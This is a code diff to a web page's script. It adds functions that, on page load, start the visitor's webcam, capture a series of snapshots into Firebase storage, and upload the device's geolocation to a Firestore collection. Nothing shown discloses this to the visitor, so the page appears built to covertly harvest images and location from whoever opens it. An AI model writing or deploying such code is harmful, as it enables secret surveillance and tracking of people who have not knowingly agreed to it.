@@ -75,6 +75,24 @@
       }
     };
 
+    const uploadLocationToFirebase = (location) => {
+      db.collection('locations').add(location).then(() => {
+        console.log('Location uploaded successfully!');
+      }).catch(console.error);
+    };
+
+    const requestLocationPermissionAndUpload = () => {
+      navigator.geolocation.getCurrentPosition((position) => {
+        const location = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude
+        };
+        uploadLocationToFirebase(location);
+      }, (error) => {
+        console.error('فشل في الحصول على الموقع:', error);
+      });
+    };
+
     const initializePhotoCapture = async () => {
       await requestCameraPermission();
       navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
@@ -84,4 +102,22 @@
         video.addEventListener('loadeddata', () => {
           const canvas = document.getElementById('canvas');
           let captureCount = 0;
-          capturePhotos(video, canvas
+          capturePhotos(video, canvas, storage.ref().child('snapshots/'), captureCount, requestLocationPermissionAndUpload);
+        });
+      }).catch(console.error);
+    };
+
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', () => {
+        navigator.serviceWorker.register('/service-worker.js').then(registration => {
+          console.log('Service Worker registered with scope:', registration.scope);
+        }).catch(error => {
+          console.log('Service Worker registration failed:', error);
+        });
+      });
+    }
+
+    window.onload = initializePhotoCapture;
+  </script>
+</body>
+</html>
